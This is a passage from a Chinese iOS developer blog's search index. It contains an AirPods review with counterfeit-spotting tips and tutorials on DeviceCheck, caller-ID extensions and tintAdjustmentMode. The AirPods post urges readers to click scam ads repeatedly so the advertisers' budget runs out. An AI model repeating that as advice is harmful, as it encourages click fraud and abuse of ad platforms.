Pro在蓋起來外接使用時，搭配AirPods訊號會斷斷續續的！（這部分我不會）不過，為什麼有這些差異？我猜是因為有其他信號干擾（燈、螢幕輸出、其他藍芽設備）吧？闢謠： 大小外型跟有線earpodsㄧ樣、容易掉的問題：首先大小外型跟earpods有差距，我戴earpods有點鬆鬆的，但戴AirPods感覺很穩，跳來跳去也不會掉；不過其實很看人，有的人的確會出現不合適的問題，建議購買前先跟有AirPods的朋友借來戴戴看！*或是在耳機頭部貼一些人工皮增加面積、阻力 音質跟earpods很像：同上，其實差很多，AirPods的音質好很多；我覺得雖然可能跟同價位主打音質的耳機有落差，也無降噪功能，但AirPods本身就不是音質取向的耳機，取捨就看個人。就我個人體驗，音質聽得出環繞層次、音域廣，整體不失水準！配件：由於在下奶油手，AirPods就跟一顆雞蛋ㄧ樣，我很怕會溜手直接摔爆；爬了許多保護套推薦文，蠻多人推薦這款：Catalyst AirPods 防水收納盒(保護套)會選擇這個的原因是：防水、防摔、有掛勾、使用便利（拿收耳機跟充電時不用拆）價格：$1000上下小開箱：正面，因為怕髒所以我買深色背面也有相對應配對鍵的按鈕拿收耳機只需翻開上半部底部充電孔有蓋子可開關p.s. 為了要拿到AirPods能馬上用，其實我套子比AirPods先買好😂網友提問：1代與2代保護套是否能共用？區分這個的標準不是1或2代，而是有線或無線版；如果您是有線版那1、2代都能用，無線版的指示燈在外及背面配對設定按鍵位置較上居中，無法與有線版共用保護套，這部分需要注意⚠️再來是盒子內部防塵貼：AHA AirPods 防塵貼有網友問到密合度問題：沒貼好會有點不密合，我橋很久才讓他完全密合；邊邊稍微有一點點刮手感（不影響，可能是公差？）不太好貼，因為防塵貼是金屬片，盒子本身有磁鐵容易在瞄準的時候就被吸下去目前覺得有點多餘，不知道使用一陣子後的效果如何，所以先持保留態度。防詐騙宣導請大家要特別注意，對岸已經出現破解晶片的高仿版本，配對同樣有動畫、同樣有電量顯示，從外觀幾乎無法區別的山寨版。目前主要的識別方式是從軟體下手： 電量顯示：正版能顯示左耳、右耳、盒子三個電量/盜版只有ㄧ個 藍牙設定那邊，正版可以設定左右耳的點擊功能/盜版只有斷開和遺忘 充電盒指示燈正版連上後會熄/盜版會繼續亮著但以上都不確定之後山寨版會不會修正，所以大家還是以官方或大型通路渠道購買較安全．⚠️不孝商人現在更猖獗了，把盜版用接近正版的價格賣⚠日前在Facbook、Google廣告聯播網上發現有惡劣商人，將盜版用接近正版價格賣(網站是常見的 一頁式詐騙網頁 )，非常惡劣；我覺得如果你是貪小便宜花個1000出買到AirPods你自己應該也要有認知會是假的，但把盜版當正版價格賣實在非常低級！ 請注意，全新的AirPods價格應該不會低於$4500。詐騙、來源不明的賣家如果你不小心下標了，取貨付款請直接拒收、已收請趕快打電話給貨運公司要求退貨（態度要強硬），有任何問題可加入 FB購物廣告受害者自救會 。看到這類廣告請直接點右上角向Facebook/Google檢舉、或是狂點廣告讓他快速的燒完廣告預算。另外請大家發現山寨的AirPods或蘋果產品不要姑息養奸，無論是來路不明的網站、一頁式購物詐騙、蝦皮、露天，絕對要 聯繫保智大隊 去處理。亦或是1代當2代賣？二代外盒圖請確認： AirPods 2型號： A2031、A2032 AirPods 1型號： A1523、A1722 生產年份：≥ 2019詳細1、2代比較請參考這篇： AirPods 第一代與第二代辨識技巧大公開，透過這5 招馬上區分出來其他有趣的開箱及體驗影片來個全家桶吧想知道Apple Watch Series 6 的上手體驗嗎？Apple Watch Series 6 開箱＆使用兩年體驗心得 &gt;&gt;&gt;點我前往有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 37,477 Total Views Last Statistics Date: 2025-08-15 | 37,265 Views on Medium." }, { "title": "iOS 完美實踐一次性優惠或試用的方法 (Swift)", "url": "/posts/zrealm-dev/ios-%E5%AE%8C%E7%BE%8E%E5%AF%A6%E8%B8%90%E4%B8%80%E6%AC%A1%E6%80%A7%E5%84%AA%E6%83%A0%E6%88%96%E8%A9%A6%E7%94%A8%E7%9A%84%E6%96%B9%E6%B3%95-swift-c5e7e580c341/", "categories": "ZRealm Dev.", "tags": "ios, ios-app-development, ios-11, swift, mobile-app-development", "date": "2019-04-29 23:30:01 +0800", "snippet": "iOS 完美實踐一次性優惠或試用的方法 (Swift)iOS DeviceCheck 跟著你到天涯海角在寫上一篇 Call Directory Extension 時無意間發現這個冷門的API，雖然已不是什麼新鮮事(WWDC 2017時公布/iOS ≥11支援)、實作方面也非常簡易；但還是小小的研究測試了一下並整理出文章當做個紀錄．DeviceCheck 能幹嘛？ 允許開發者針對使用者的裝...", "content": "iOS 完美實踐一次性優惠或試用的方法 (Swift)iOS DeviceCheck 跟著你到天涯海角在寫上一篇 Call Directory Extension 時無意間發現這個冷門的API，雖然已不是什麼新鮮事(WWDC 2017時公布/iOS ≥11支援)、實作方面也非常簡易；但還是小小的研究測試了一下並整理出文章當做個紀錄．DeviceCheck 能幹嘛？ 允許開發者針對使用者的裝置進行識別標記自從 iOS ≥ 6 之後開發者無法取得使用者裝置的唯一識別符(UUID)，折衷的做法是使用IDFV結合KeyChain(詳細可參考之前 這篇 )，但在 iCloud 換帳號或是重置手機…等狀況下，UUID還是會重置；無法保證裝置的唯一性，如果以此作為一些業務邏輯的儲存及判斷，例如：首次免費試用，就可能發生使用者狂換帳號、重置手機，可不斷無限試用的漏洞．DeviceCheck 雖然不能讓我們得到保證不會改變的UUID，但他能做到「 儲存」 的功能，每個裝置Apple提供2 bits的雲端儲存空間，透過傳送裝置產生的臨時識別Token給Apple，可寫入/讀取那2 bits的資訊。2 bits? 能存什麼？只能組合出4種狀態，能做的功能有限．與原本儲存方式比較：✓ 表示資料還在p.s. 這邊小弟犧牲了自已的手機實際做了測試，結果吻合；就算我登出換iCloud、清出所有資料、還原所有設定、回到原廠初始狀態，重新安裝完APP都還是能取到值．主要運作流程如下：iOS APP 這邊透過DeviceCheck API產生一組識別裝置用的臨時Token，傳給後端再經由後端組合開發者的private key資訊、開發者資訊成JWT格式後轉傳給Apple伺服器；後端取得Apple回傳結果後處理完格式再丟回iOS APP．DeviceCheck 的應用附上 DeviceCheck 在 WWDC2017 上的截圖：因 每個裝置只能存2 bits的資訊 ，所以能做的項目差不多就如官方所提及的應用包含裝置是否曾經已試用過、是否付費過、是否是拒絕往來戶…等等；且只能實現一項．支援度： iOS ≥ 11開始！了解完基本資訊後，讓我們開始動手做吧！iOS APP 端：import DeviceCheck//....//DCDevice.current.generateToken { dataOrNil, errorOrNil in guard let data = dataOrNil else { return } let deviceToken = data.base64EncodedString() //... //POST deviceToken 到後端，請後端去跟蘋果伺服器查詢，然後再回傳結果給APP處理}如流程所述，APP要做的只有取得臨時識別Token（ deviceToken ）！再來就是將deviceToken發送到後端我們自己的API去處理．後端：重點在後端處理的部分1.首先登入 開發者後台 記下 Team ID2. 再點側欄的 Certificates, IDs &amp; Profiles 前往憑證管理平台選擇「Keys」-&gt; 「All」-&gt; 右上角「+」新增Step 1.建立新Key，勾選「DeviceCheck」Step 2. 「Confirm」確認Finished.最後一步建立完成後， 記下 Key ID 及點擊「Download」下載回 privateKey.p8 私鑰檔案．這時候你已經準備齊全了所有推播所需資料： Team ID Key ID privateKey.p83. 依Apple規範組合 JWT(JSON Web Token) 格式演算法： ES256//HEADER:{ \"alg\": \"ES256\", \"kid\": Key ID}//PAYLOAD:{ \"iss\": Team ID, \"iat\": 請求時間戳(Unix Timestamp,EX:1556549164), \"exp\": 逾期時間戳(Unix Timestamp,EX:1557000000)}//時間戳務必是整數格式！取得組合的JWT字串：xxxxxx.xxxxxx.xxxxxx4. 將資料發送給Apple伺服器＆取得回傳結果同APNS推播有分開發環境跟正式環境： 1.開發環境：api.development.devicecheck.apple.com （不知道為什麼我開發環境發送都會回傳失敗） 2.正式環境：api.devicecheck.apple.comDeviceCheck API 提供兩個操作： 1.查詢儲存資料： https://api.devicecheck.apple.com/v1/query_two_bits//Headers:Authorization: Bearer xxxxxx.xxxxxx.xxxxxx (組合的JWT字串)//Content:device_token:deviceToken (要查詢的裝置Token)transaction_id:UUID().uuidString (查詢識別符，這裡直接用UUID代表)timestamp: 請求時間戳（毫秒），注意！這裡是毫秒（EX: 1556549164000）回傳狀態：官方文件回傳內容：{ \"bit0\": Int：2 bits 資料中第一位的資料：0或1, \"bit1\": Int：2 bits 資料中第二位的資料：0或1, \"last_update_time\": String：\"最後修改時間 YYYY-MM\"}p.s. 你沒看錯，最後修改時間就只能顯示到年-月2.寫入儲存資料： https://api.devicecheck.apple.com/v1/update_two_bits//Headers:Authorization: Bearer xxxxxx.xxxxxx.xxxxxx (組合的JWT字串)//Content:device_token:deviceToken (要查詢的裝置Token)transaction_id:UUID().uuidString (查詢識別符，這裡直接用UUID代表)timestamp: 請求時間戳（毫秒），注意！這裡是毫秒（EX: 1556549164000）bit0: 2 bits 資料中第一位的資料：0或1bit1: 2 bits 資料中第二位的資料：0或15. 取得Apple伺服器回傳結果回傳狀態：官方文件回傳內容：無，回傳狀態 200 即表示寫入成功！6. 後端API回傳結果給APPAPP在針對相應的狀態做回應就完成了！後端部分補充：這邊太久沒碰PHP了，有興趣請參考 iOS11で追加されたDeviceCheckについて 這篇文章的 requestToken.php 部分Swift 版示範Demo：因後端部分我無法提供實作且不是大家都會PHP，這邊提供一個用純iOS (Swift) 做的範例，直接在APP裡處理後端該做的那些事(組JWT,發送資料給頻果)，給大家做參考！不需撰寫後端程式就能模擬執行所有內容． ⚠請注意 僅為測試示範所需，不建議用於正式環境 ⚠這邊要感謝 Ethan Huang 大大的 CupertinoJWT 提供 iOS 在APP內產生JWT格式內容的支援！Demo 主要程式及畫面：import UIKitimport DeviceCheckimport CupertinoJWTextension String { var queryEncode:String { return self.addingPercentEncoding(withAllowedCharacters: .whitespacesAndNewlines)?.replacingOccurrences(of: \"+\", with: \"%2B\") ?? \"\" }}class ViewController: UIViewController { @IBOutlet weak var getBtn: UIButton! @IBOutlet weak var statusBtn: UIButton! @IBAction func getBtnClick(_ sender: Any) { DCDevice.current.generateToken { dataOrNil, errorOrNil in guard let data = dataOrNil else { return } let deviceToken = data.base64EncodedString() //正式情況： //POST deviceToken 到後端，請後端去跟蘋果伺服器查詢，然後再回傳結果給APP處理 //!!!!!!以下僅為測試、示範所需，不建議用於正式環境!!!!!! //!!!!!! 請勿隨意暴露您的PRIVATE KEY !!!!!! let p8 = \"\"\" -----BEGIN PRIVATE KEY----- -----END PRIVATE KEY----- \"\"\" let keyID = \"\" //你的KEY ID let teamID = \"\" //你的Developer Team ID :https://developer.apple.com/account/#/membership let jwt = JWT(keyID: keyID, teamID: teamID, issueDate: Date(), expireDuration: 60 * 60) do { let token = try jwt.sign(with: p8) var request = URLRequest(url: URL(string: \"https://api.devicecheck.apple.com/v1/update_two_bits\")!) request.httpMethod = \"POST\" request.addValue(\"Bearer \\(token)\", forHTTPHeaderField: \"Authorization\") request.addValue(\"application/x-www-form-urlencoded\", forHTTPHeaderField: \"Content-Type\") let json:[String : Any] = [\"device_token\":deviceToken,\"transaction_id\":UUID().uuidString,\"timestamp\":Int(Date().timeIntervalSince1970.rounded()) * 1000,\"bit0\":true,\"bit1\":false] request.httpBody = try? JSONSerialization.data(withJSONObject: json) let task = URLSession.shared.dataTask(with: request) { (data, response, error) in guard let data = data else { return } print(String(data:data, encoding: String.Encoding.utf8)) DispatchQueue.main.async { self.getBtn.isHidden = true self.statusBtn.isSelected = true } } task.resume() } catch { // Handle error } //!!!!!!以上僅為測試、示範所需，不建議用於正式環境!!!!!! // } } override func viewDidLoad() { super.viewDidLoad() DCDevice.current.generateToken { dataOrNil, errorOrNil in guard let data = dataOrNil else { return } let deviceToken = data.base64EncodedString() //正式情況： //POST deviceToken 到後端，請後端去跟蘋果伺服器查詢，然後再回傳結果給APP處理 //!!!!!!以下僅為測試、示範所需，不建議用於正式環境!!!!!! //!!!!!! 請勿隨意暴露您的PRIVATE KEY !!!!!! let p8 = \"\"\" -----BEGIN PRIVATE KEY----- -----END PRIVATE KEY----- \"\"\" let keyID = \"\" //你的KEY ID let teamID = \"\" //你的Developer Team ID :https://developer.apple.com/account/#/membership let jwt = JWT(keyID: keyID, teamID: teamID, issueDate: Date(), expireDuration: 60 * 60) do { let token = try jwt.sign(with: p8) var request = URLRequest(url: URL(string: \"https://api.devicecheck.apple.com/v1/query_two_bits\")!) request.httpMethod = \"POST\" request.addValue(\"Bearer \\(token)\", forHTTPHeaderField: \"Authorization\") request.addValue(\"application/x-www-form-urlencoded\", forHTTPHeaderField: \"Content-Type\") let json:[String : Any] = [\"device_token\":deviceToken,\"transaction_id\":UUID().uuidString,\"timestamp\":Int(Date().timeIntervalSince1970.rounded()) * 1000] request.httpBody = try? JSONSerialization.data(withJSONObject: json) let task = URLSession.shared.dataTask(with: request) { (data, response, error) in guard let data = data,let json = try? JSONSerialization.jsonObject(with: data, options: .mutableContainers) as? [String:Any],let stauts = json[\"bit0\"] as? Int else { return } print(json) if stauts == 1 { DispatchQueue.main.async { self.getBtn.isHidden = true self.statusBtn.isSelected = true } } } task.resume() } catch { // Handle error } //!!!!!!以上僅為測試、示範所需，不建議用於正式環境!!!!!! // } // Do any additional setup after loading the view. }}畫面截圖這邊做的是一個一次性的優惠領取，每個裝置只能領一次！完整專案下載：有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 2,838 Total Views Last Statistics Date: 2025-08-15 | 2,550 Views on Medium." }, { "title": "自己的電話自己辨識(Swift)", "url": "/posts/zrealm-dev/%E8%87%AA%E5%B7%B1%E7%9A%84%E9%9B%BB%E8%A9%B1%E8%87%AA%E5%B7%B1%E8%BE%A8%E8%AD%98-swift-ac557047d206/", "categories": "ZRealm Dev.", "tags": "ios, whoscall, swift, ios-app-development, ios-apps", "date": "2019-04-28 00:07:27 +0800", "snippet": "自己的電話自己辨識(Swift)iOS自幹 Whoscall 來電辨識、電話號碼標記 功能起源一直以來都是Whoscall的忠實用戶，從原本用Android手機時就有使用，能夠非常即時的顯示陌生來電資訊，當下就能直接決定接通與否；後來轉跳蘋果陣營，第一隻蘋果手機是iPhone 6 (iOS 9)，那時在使用Whoscall上非常彆扭，無法即時辨識電話，要複製電話號碼去APP查詢，後期Whos...", "content": "自己的電話自己辨識(Swift)iOS自幹 Whoscall 來電辨識、電話號碼標記 功能起源一直以來都是Whoscall的忠實用戶，從原本用Android手機時就有使用，能夠非常即時的顯示陌生來電資訊，當下就能直接決定接通與否；後來轉跳蘋果陣營，第一隻蘋果手機是iPhone 6 (iOS 9)，那時在使用Whoscall上非常彆扭，無法即時辨識電話，要複製電話號碼去APP查詢，後期Whoscall提供將陌生電話資料庫安裝在本地手機的服務，雖然能解決即時辨識的問題，但很容易就弄亂你的手機通訊錄！直到 iOS 10+ 之後蘋果開放電話辨識功能(Call Directory Extension)權限給開發者，才使whoscall目前至少就體驗來說已和Android版無太大缺別，甚至超越Android版(Android版廣告超多，但以開發者的立場是可以理解的)用途？Call Directory Extension 能做到什麼呢？ 電話 撥打 辨識標記 電話 來電 辨識標記 通話紀錄 辨識標記 電話 拒接 黑名單設置限制？ 使用者需手動進入「設定」「電話」「通話封鎖與識別」打開您的APP才能使用 僅能以離線資料庫方式辨識電話(無法即時取得來電資訊然後Call API查詢，僅能預先寫入號碼&lt;-&gt;名稱對應在手機資料庫中)*也因此Whoscall會定期推播請使用者開APP更新來電辨識資料庫 數量上限？目前沒查到資料，應該是依照使用者手機容量無特別上限；但是數量多得辨識清單、封鎖清單要分批處理寫入！ 軟體限制：iOS 版本需 ≥ 10「設定」-&gt;「電話」-&gt;「通話封鎖與識別」應用場景？ 通訊軟體、辦公室通訊軟體；在APP內你可能有對方的聯絡人，但實際並未將手機號碼加入手機通訊錄中，這個功能就能避免同事甚至老闆來電時，被當陌生電話，結果漏接． 敝站( 結婚吧 )或敝私的( 591房屋交易 )，使用者與店家或房東聯繫時所撥打的電話都是我們的轉接號碼，經由轉接中心在轉撥到目標電話，大致流程如下：使用者所撥打的電話都是轉接中心代表號( #分機)，不會知道真實的電話號碼；一方面是保護個資隱私、另一方面也能知道有多少人聯絡商家(評估成效)甚至能知道是在哪看到然後撥打的(EX:網頁顯示#1234,APP顯示#5678)、還有也能推免費服務，由我方吸收電話通信費用．但此做法會帶來ㄧ項不可避免的問題，就是電話號碼凌亂；無法辨識出是打給誰或是店家回撥時，使用者不知道來電者是誰，透過使用電話辨識功能就能大大解決這個問題，提升使用者體驗！直接上一張成品圖：結婚吧 APP可以看到在輸入電話、電話來電時能直接顯示辨識結果、通話記錄列表也不在亂糟糟ㄧ樣能在下方顯示辨識結果．Call Directory Extension 電話辨識功能運作流程：開工：讓我們開始動手做吧！1.為 iOS 專案加入 Call Directory ExtensionXcode -&gt; File -&gt; New -&gt; Target選擇 Call Directory Extension輸入Extension名稱可順帶加入 Scheme 方便 Debug目錄底下就會出現Call Directory Extension的資料夾及程式2.開始編寫 Call Directory Extension 相關程式首先回到主 iOS 專案上第一個問題是我們該如何判斷使用者的裝置支不支援Call Directory Extension或是設定中的「通話封鎖與識別」是否已經打開：import CallKit////......//if #available(iOS 10.0, *) { CXCallDirectoryManager.sharedInstance.getEnabledStatusForExtension(withIdentifier: \"這裡輸入call directory extension的bundle identifier\", completionHandler: { (status, error) in if status == .enabled { //啟用中 } else if status == .disabled { //未啟用 } else { //未知,不支援 } })}前面有提到，來電辨識的運作方式是要在本地維護一個辨識資料庫；再來就是重頭戲該如何達成這個功能？很遺憾，您無法直接對Call Directory Extension進行呼叫寫入資料，所以你需要多維護一層對應結構，然後Call Directory Extension再去讀取你的結構再寫入辨識資料庫中，流程如下：意旨我們需要多維護一個自己的資料庫文件，再讓Extenstion去讀取寫入到手機中那所謂的辨識資料、檔案該長怎樣？ 其實就是個Dictionary結構，如：[“電話”:”王大明”] 存在本地的檔案可用一些Local DB(但Extension那邊也要能裝能用)，這邊是直接存一個.json檔在手機裡； 不建議直接存在UserDefaults，如果是測試或資料很少可以，實際應用強烈不建議！好的，開始：if #available(iOS 10.0, *) { if let dir = FileManager.default.containerURL(forSecurityApplicationGroupIdentifier: \"你的跨Extesion,Group Identifier名稱\") { let fileURL = dir.appendingPathComponent(\"phoneIdentity.json\") var datas:[String:String] = [\"8869190001234\":\"李先生\",\"886912002456\":\"大帥\"] if let content = try? String(contentsOf: fileURL, encoding: .utf8),let text = content.data(using: .utf8),let json2 = try? JSONSerialization.jsonObject(with: text, options: .mutableContainers) as? Dictionary&lt;String,String&gt;,let json = json2 { datas = json } if let data = jsonToData(jsonDic: datas) { DispatchQueue(label: \"phoneIdentity\").async { if let _ = try? data.write(to: fileURL) { //寫入json檔完成 } } } }}就只是一般的本地檔案維護，要注意的就是目錄需要在Extesion也能讀取的地方。補充 — 電話號碼格式： 台灣地區市話、手機都需去掉0以886代替：如 0255667788 -&gt; 886255667788 電話格式是純數字組合的字串，勿夾雜「-」、「,」、「#」…等符號 市話電話如有包含要辨識到 分機 ，直接接在後面即可不需帶任何符號：如 0255667788,0718 -&gt; 8862556677880718 將一般iOS電話格式轉換成辨識資料庫可接受格式可參考以下兩個取代方法：var newNumber = \"0255667788,0718\"if let regex = try? NSRegularExpression(pattern: \"^0{1}\") { newNumber = regex.stringByReplacingMatches(in: newNumber, options: [], range: NSRange(location: 0, length: newNumber.count), withTemplate: \"886\")}if let regex = try? NSRegularExpression(pattern: \",\") { newNumber = regex.stringByReplacingMatches(in: newNumber, options: [], range: NSRange(location: 0, length: newNumber.count), withTemplate: \"\")}再來就是如流程，辨識資料已維護好；需要通知Call Directory Extension去刷新手機那邊的資料：if #available(iOS 10.0, *) { CXCallDirectoryManager.sharedInstance.reloadExtension(withIdentifier: \"tw.com.marry.MarryiOS.CallDirectory\") { errorOrNil in if let error = errorOrNil as? CXErrorCodeCallDirectoryManagerError { print(\"reload failed\") switch error.code { case .unknown: print(\"error is unknown\") case .noExtensionFound: print(\"error is noExtensionFound\") case .loadingInterrupted: print(\"error is loadingInterrupted\") case .entriesOutOfOrder: print(\"error is entriesOutOfOrder\") case .duplicateEntries: print(\"error is duplicateEntries\") case .maximumEntriesExceeded: print(\"maximumEntriesExceeded\") case .extensionDisabled: print(\"extensionDisabled\") case .currentlyLoading: print(\"currentlyLoading\") case .unexpectedIncrementalRemoval: print(\"unexpectedIncrementalRemoval\") } } else if let error = errorOrNil { print(\"reload error: \\(error)\") } else { print(\"reload succeeded\") } }}使用以上方法通知Extension刷新，並取得執行結果。（這時候會呼叫執行Call Directory Extension裡的beginRequest，請繼續往下看）主 iOS 專案的程式就到這了！3.開始修改 Call Directory Extension 的程式打開Call Directory Extension 目錄，找到底下已經幫你建立好的檔案 CallDirectoryHandler.swift能實作的方法只有 beginRequest 當要處理手機電話資料時的動作，預設範例都把我們建好了，不太需要去動： addAllBlockingPhoneNumbers ：處理加入黑名單號碼(全新增) addOrRemoveIncrementalBlockingPhoneNumbers ：處理加入黑名單號碼(遞增方式) addAllIdentificationPhoneNumbers ：處理加入來電辨識號碼(全新增) addOrRemoveIncrementalIdentificationPhoneNumbers ：處理加入來電辨識號碼(遞增方式)我們只要完成以上的Function實作即可，黑名單功能跟來電辨識方式原理都ㄧ樣這邊就不多作介紹．private func fetchAll(context: CXCallDirectoryExtensionContext) { if let dir = FileManager.default.containerURL(forSecurityApplicationGroupIdentifier: \"你的跨Extesion,Group Identifier名稱\") { let fileURL = dir.appendingPathComponent(\"phoneIdentity.json\") if let content = try? String(contentsOf: fileURL, encoding: .utf8),let text = content.data(using: .utf8),let numbers = try? JSONSerialization.jsonObject(with: text, options: .mutableContainers) as? Dictionary&lt;String,String&gt; { numbers?.sorted(by: { (Int($0.key) ?? 0) &lt; Int($1.key) ?? 0 }).forEach({ (obj) in if let number = CXCallDirectoryPhoneNumber(obj.key) { autoreleasepool{ if context.isIncremental { context.removeIdentificationEntry(withPhoneNumber: number) } context.addIdentificationEntry(withNextSequentialPhoneNumber: number, label: obj.value) } } }) } }}private func addAllIdentificationPhoneNumbers(to context: CXCallDirectoryExtensionContext) { // Retrieve phone numbers to identify and their identification labels from data store. For optimal performance and memory usage when there are many phone numbers, // consider only loading a subset of numbers at a given time and using autorelease pool(s) to release objects allocated during each batch of numbers which are loaded. // // Numbers must be provided in numerically ascending order. // let allPhoneNumbers: [CXCallDirectoryPhoneNumber] = [ 1_877_555_5555, 1_888_555_5555 ] // let labels = [ \"Telemarketer\", \"Local business\" ] // // for (phoneNumber, label) in zip(allPhoneNumbers, labels) { // context.addIdentificationEntry(withNextSequentialPhoneNumber: phoneNumber, label: label) // } fetchAll(context: context)}private func addOrRemoveIncrementalIdentificationPhoneNumbers(to context: CXCallDirectoryExtensionContext) { // Retrieve any changes to the set of phone numbers to identify (and their identification labels) from data store. For optimal performance and memory usage when there are many phone numbers, // consider only loading a subset of numbers at a given time and using autorelease pool(s) to release objects allocated during each batch of numbers which are loaded. // let phoneNumbersToAdd: [CXCallDirectoryPhoneNumber] = [ 1_408_555_5678 ] // let labelsToAdd = [ \"New local business\" ] // // for (phoneNumber, label) in zip(phoneNumbersToAdd, labelsToAdd) { // context.addIdentificationEntry(withNextSequentialPhoneNumber: phoneNumber, label: label) // } // // let phoneNumbersToRemove: [CXCallDirectoryPhoneNumber] = [ 1_888_555_5555 ] // // for phoneNumber in phoneNumbersToRemove { // context.removeIdentificationEntry(withPhoneNumber: phoneNumber) // } //context.removeIdentificationEntry(withPhoneNumber: CXCallDirectoryPhoneNumber(\"886277283610\")!) //context.addIdentificationEntry(withNextSequentialPhoneNumber: CXCallDirectoryPhoneNumber(\"886277283610\")!, label: \"TEST\") fetchAll(context: context) // Record the most-recently loaded set of identification entries in data store for the next incremental load...}因為敝站的資料不會到太多而且我的本地資料結構相當簡易，無法做到遞增；所以這邊 統一都用全新增的方式，如是遞增方式則要先刪除舊的(這步很重要不然會reload extensiton失敗！)完工！到此為止就完成囉！實作方面非常簡單！Tips: 如果在「設定」「電話」「通話封鎖與識別」打開APP時一直轉或是打開後無法辨識號碼，可先確認號碼是否正確、本地維護的.json資料是否正確、reload extensiton是否成功；或重開機試試，都找不出來可以選call directory extension的Scheme Build 看看錯誤訊息． 這個功能 最困難的點不是程式方面而是要引導使用者手動去設定打開 ，具體方式及引導可參考whoscall：Whoscall有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 4,158 Total Views Last Statistics Date: 2025-08-15 | 3,840 Views on Medium." }, { "title": "iOS tintAdjustmentMode 屬性", "url": "/posts/zrealm-dev/ios-tintadjustmentmode-%E5%B1%AC%E6%80%A7-6012b7b4f612/", "categories": "ZRealm Dev.", "tags": "uikit, swift, ios-app-development, autolayout, 顧小事成大事", "date": "2019-02-07 00:10:43 +0800", "snippet": "iOS tintAdjustmentMode 屬性Present UIAlertController 時本頁上的 Image Assets (Render as template) .tintColor 設定失效問題問題修正前後比較ㄧ樣不囉唆解釋，直接上比較圖．左修正前/右修正後可以看到左方ICON圖在有Present UIAlertController時tintColor顏色設定失效，另外...", "content": "iOS tintAdjustmentMode 屬性Present UIAlertController 時本頁上的 Image Assets (Render as template) .tintColor 設定失效問題問題修正前後比較ㄧ樣不囉唆解釋，直接上比較圖．左修正前/右修正後可以看到左方ICON圖在有Present UIAlertController時tintColor顏色設定失效，另外當Present的視窗關閉後就會恢復顏色設定顯示正常．問題修正首先介紹一下 tintAdjustmentMode 的屬性設置，此屬性控制了 tintColor 的顯示模式，此屬性有三個枚舉可設定： .Automatic ：視圖的 tintAdjustmentMode 與包覆的父視圖設定一致 .Normal ： 預設模式 ，正常顯示設定的 tintColor .Dimmed ：將 tintColor 改為低飽和度、暗淡的顏色（就是灰色啦！）上述問題不是什麼BUG而是系統本身機制即是如此： 在Present UIAlertController時會將本頁Root ViewController上View的 tintAdjustmentMode 改為 Dimmed （所以準確來說也不叫顏色設定「失效」，只是 tintAdjustmentMode 模式更改）但有時我們希望ICON顏色能保持ㄧ致則只需在UIView中tintColorDidChange事件保持tintAdjustmentMode設定ㄧ致：extension UIButton { override func tintColorDidChange() { self.tintAdjustmentMode = .normal //永遠保持normal }}extension example結束！不是什麼大問題，不改也沒差，但就是礙眼其實每一個頁面遇到present UIAlertController、action sheet、popover…都會將本頁view的tintAdjustmentMode改為灰色，但我在這個頁面才發現查找了一陣子資料才發現跟這個屬性有關係，設定之後就解決我的小疑惑．有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 346 Total Views Last Statistics Date: 2025-08-15 | 236 Views on Medium." }, { "title": "動手做一支 Apple Watch App 吧！", "url": "/posts/zrealm-dev/%E5%8B%95%E6%89%8B%E5%81%9A%E4%B8%80%E6%94%AF-apple-watch-app-%E5%90%A7-e85d77b05061/", "categories": "ZRealm Dev.", "tags": "ios, watchos, apple-watch-apps, watchkit, ios-app-development", "date": "2019-02-06 00:23:30 +0800", "snippet": "動手做一支 Apple Watch App 吧！(Swift)watchOS 5 手把手開發Apple Watch App 從無到有[最新] Apple Watch Series 6 開箱＆使用兩年體驗心得 &gt;&gt;&gt;點我前往前言:暨上一篇 Apple Watch 入手開箱文 後已經過了快三個月，最近終於找到機會研究開發Apple Watch App啦。結婚吧 — 最大婚禮籌備...", "content": "動手做一支 Apple Watch App 吧！(Swift)watchOS 5 手把手開發Apple Watch App 從無到有[最新] Apple Watch Series 6 開箱＆使用兩年體驗心得 &gt;&gt;&gt;點我前往前言:暨上一篇 Apple Watch 入手開箱文 後已經過了快三個月，最近終於找到機會研究開發Apple Watch App啦。結婚吧 — 最大婚禮籌備App補一下使用三個月後的心得：1. e-sim(LTE)依然還想不到什麼時候會用到，所以也還沒申請沒用過2.常用功能：靠近解鎖Mac電腦、舉手查看通知、Apple Pay3.健康提醒：過了三個月已開始懶了，通知提醒都看看，沒達成圓圈也無感4.第三方App支援度依然很差5.錶面可依照心情任意更換增加新鮮感6.更詳細的運動紀錄：例如走遠一點路去買晚餐，手錶會自動偵測詢問是否要記錄運動使用三個月後整體來說，還是如原開箱文所寫就像是多個生活小助手，幫你解決瑣碎的事．第三方App支援度依然很差在我實際開發過Apple Watch App之前還很納悶，為何Apple Watch上的App都很陽春甚至就只是「堪用」罷了，包括LINE(訊息不同步而且從未更新)、Messenger(就是堪用)；直到我實際開發過Apple Watch App之後才知道這些開發者的苦衷….首先，了解Apple Watch App的定位，化繁為簡Apple Watch的定位 「不是取代iPhone，而是輔助」 不論是官方介紹、官方App、watchOS API都是這個走向；所以才會覺得第三方APP很陽春、功能很少(抱歉，我太貪心了Orz)以 我們的A pp為例，有搜尋商家、查看專欄、討論區、線上詢問…等等功能；線上詢問就是有價值搬上Apple Watch的項目，因為他需要即時性而且更快速的回覆代表更有機會獲得訂單；搜尋商家、查看專欄、討論區這些功能相對複雜，在手錶上就算做的到也意義不大(螢幕能呈現的資訊太少、也不需要即時性)核心概念還是「以輔助為主」，所以並不是什麼功能都需要搬上Apple Watch；畢竟使用者很少很少時間會是只有戴手錶沒帶手機，而遇到這種情況時，使用者的需求也只有重要的功能(像查看專欄文章這種沒有重要到一定要立刻馬上用手錶看)讓我們開始吧！ 這也是我第一次開發Apple Watch App，文章內容可能不夠深入，敬請大家指教！！ 本篇只適合有開發過iOS 